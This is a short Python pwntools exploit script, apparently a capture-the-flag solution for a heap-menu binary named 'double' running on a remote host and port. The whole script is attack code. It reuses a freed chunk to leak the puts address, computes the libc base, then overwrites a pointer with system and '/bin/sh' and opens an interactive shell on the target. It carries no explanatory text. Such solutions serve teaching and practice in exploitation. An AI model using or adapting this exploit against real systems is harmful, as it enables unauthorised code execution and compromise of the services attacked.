from pwn import *
elf=ELF("double")
#io=elf.process()
#io=elf.process(,env={'LD_PRELOAD':'.so'})
io=remote("123.207.32.26",9001)
libc=elf.libc
#libc=ELF("")
context.log_level='debug'

sla=io.sendlineafter
sl=io.sendline
sa=io.sendafter
ru=io.recvuntil
shell=io.interactive

def menu(choice):
	sla("choice:\n",str(choice))

def addinfo(length,message='jb'):
	menu(1)
	sla("length\n",str(length))
	sa("message\n",message)

def delinfo(index):
	menu(2)
	sla("delete\n",str(index))

def showinfo(index):
	menu(3)
	sla("watch\n",str(index))

addinfo(0x10)
delinfo(0)
addinfo(0x10,'a'*8)
showinfo(1)
ru('a'*8)
puts_addr=ru('\n',True)
puts_addr=u64(puts_addr+'\x00\x00')
libcbase=puts_addr-libc.sym['puts']
print hex(libcbase)
libc.address=libcbase

addinfo(0x10)
delinfo(2)
addinfo(0x10,p64(libc.search('/bin/sh').next())+p64(libc.sym['system']))
showinfo(2)
shell()
